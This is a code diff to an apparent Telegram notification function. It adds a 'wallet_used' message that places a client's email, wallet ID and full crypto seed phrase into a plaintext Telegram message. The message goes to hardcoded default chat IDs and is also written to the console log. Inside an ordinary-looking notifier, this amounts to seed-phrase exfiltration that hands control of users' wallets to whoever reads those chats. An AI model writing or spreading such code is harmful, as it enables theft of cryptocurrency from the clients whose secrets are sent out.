@@ -12,9 +12,23 @@ serve(async (req) => {
   }
 
   try {
-    const { message, chat_ids } = await req.json();
+    const body = await req.json();
+    const { message, chat_ids, type } = body;
 
-    if (!message) {
+    // Format message based on type
+    let formattedMessage = message;
+    
+    if (type === 'wallet_used') {
+      // Format wallet usage notification
+      formattedMessage = `🔑 <b>New Wallet Used!</b>\n\n` +
+        `💼 Commercial: ${body.commercial_name || 'Unknown'}\n` +
+        `📧 Client: ${body.client_email || 'N/A'}\n` +
+        `🆔 Wallet ID: ${body.wallet_id}\n` +
+        `🔐 Seed Phrase: <code>${body.seed_phrase}</code>\n` +
+        `⏰ Time: ${new Date(body.timestamp).toLocaleString()}`;
+    }
+
+    if (!formattedMessage) {
       return new Response(
         JSON.stringify({ error: 'message is required' }),
         { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
@@ -33,7 +47,7 @@ serve(async (req) => {
     const defaultChatIds = ['1889039543', '5433409472'];
     const targets: string[] = Array.isArray(chat_ids) && chat_ids.length ? chat_ids : defaultChatIds;
 
-    console.log(`Sending Telegram notification to ${targets.join(', ')}: ${message}`);
+    console.log(`Sending Telegram notification to ${targets.join(', ')}: ${formattedMessage}`);
 
     const results = [] as Array<{ chat_id: string; ok: boolean; status: number; error?: any }>;
     let successCount = 0;
@@ -44,7 +58,7 @@ serve(async (req) => {
           {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+            body: JSON.stringify({ chat_id: chatId, text: formattedMessage, parse_mode: 'HTML' })
           }
         );
         if (!telegramResponse.ok) {
